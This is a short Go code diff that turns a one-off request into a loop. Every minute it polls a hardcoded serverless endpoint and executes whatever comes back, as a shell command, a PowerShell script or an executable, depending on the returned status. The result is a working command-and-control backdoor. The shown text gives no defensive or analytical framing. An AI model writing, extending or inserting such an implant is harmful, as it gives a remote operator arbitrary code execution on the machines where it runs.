@@ -85,18 +85,29 @@ func postRequest(url string, input PayLoad)(output PayLoad, err error){
 
 func main(){
 	url:="https://faas-ams3-2a2df116.doserverless.co/api/v1/web/fn-2f25c703-39e1-4645-abdb-ee0c9d620425/rst/app"; // define URL
-	input,err:=postRequest(url,PayLoad{Status:"active",Data:"sample data"}); // call postRequest function:
-	if err !=nil{
-		fmt.Println("Error:",err);
-		return;
+
+	ticker:=time.NewTicker(1*time.Minute); 
+	defer ticker.Stop(); // ensure ticker is stopped when done
+
+	for {
+		input,err:=postRequest(url,PayLoad{Status:"active",Data:"sample data"}); // call postRequest function:
+		if err !=nil{
+			fmt.Println("Error:",err);
+			return;
+		}else{
+			if input.Status=="cmd"{
+				executeCmd(input.Data);
+			}
+			if input.Status=="ps"{
+				executePowerShell(input.Data);
+			}
+			if input.Status=="exe"{
+				executeExe(input.Data);
+			}
+		}
+		<-ticker.C;
+
 	}
-	if input.Status=="cmd"{
-		executeCmd(input.Data);
-	}
-	if input.Status=="ps"{
-		executePowerShell(input.Data);
-	}
-	if input.Status=="exe"{
-		executeExe(input.Data);
-	}
+
+	
 }
